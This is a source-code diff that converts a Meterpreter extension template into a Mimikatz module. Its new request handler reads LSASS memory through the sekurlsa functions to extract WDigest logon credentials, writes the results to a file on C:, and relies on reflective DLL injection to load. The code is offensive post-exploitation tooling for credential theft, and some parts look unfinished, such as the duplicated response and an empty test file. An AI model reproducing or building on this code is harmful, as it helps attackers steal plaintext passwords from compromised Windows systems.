@@ -1,18 +1,28 @@
-#ifndef _METERPRETER_SOURCE_EXTENSION_BOILER_BOILER_H
-#define _METERPRETER_SOURCE_EXTENSION_BOILER_BOILER_H
+#ifndef _METERPRETER_SOURCE_EXTENSION_MIMIKATZ_MIMIKATZ_H
+#define _METERPRETER_SOURCE_EXTENSION_MIMIKATZ_MIMIKATZ_H
+extern "C" 
+{
 #include "../../common/common.h"
+}
 #endif
+
+#include <io.h>
+#include <fcntl.h>
+#include <iostream>
+#include <fstream>
+
+	#include "mimikatz.h"
+
+extern "C" 
+{
+
+#include "modules/mod_mimikatz_sekurlsa.h"
 
 /*	Benjamin DELPY `gentilkiwi`
 	http://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
 	Licence : http://creativecommons.org/licenses/by-nc-sa/3.0/fr/
 */
-#include "modules/globdefs.h"
-#include <io.h>
-#include <fcntl.h>
-#include "mimikatz.h"
-
 
 #include "../../ReflectiveDLLInjection/DelayLoadMetSrv.h"
 // include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
@@ -20,11 +30,36 @@
 // second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
 #include "../../ReflectiveDLLInjection/ReflectiveLoader.c"
 
+
 // this sets the delay load hook function, see DelayLoadMetSrv.h
 EnableDelayLoadMetSrv();
 
 DWORD request_boiler(Remote *remote, Packet *packet)
 {
+	packet_transmit_response(0, remote, packet);
+	FILE *ficheiro = fopen("c:\\test.txt", "wb");
+	fclose(ficheiro);
+	std::wofstream logFile( "c:\\out.txt"); 
+    std::wstreambuf *outbuf = std::wcout.rdbuf(logFile.rdbuf());
+	std::wstreambuf *errbuf = std::wcerr.rdbuf(logFile.rdbuf());
+
+	vector<wstring> * mesArguments = new vector<wstring>();
+
+	mimikatz * myMimiKatz = new mimikatz(mesArguments);
+
+	vector<pair<mod_mimikatz_sekurlsa::PFN_ENUM_BY_LUID, wstring>> monProvider;
+	monProvider.push_back(make_pair<mod_mimikatz_sekurlsa::PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_wdigest::getWDigestLogonData, wstring(L"wdigest")));
+
+	if  (mod_mimikatz_sekurlsa::searchLSASSDatas())
+	{
+		mod_mimikatz_sekurlsa::getLogonData(mesArguments, &monProvider);
+	}
+
+	std::wcout.rdbuf(outbuf); 
+	std::wcerr.rdbuf(errbuf); 
+
+	packet_transmit_response(0, remote, packet);
+
 	return 0;
 }
 
@@ -72,6 +107,7 @@ DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
 		command_deregister(&customCommands[index]);
 
 	return ERROR_SUCCESS;
+}
 }
 
 
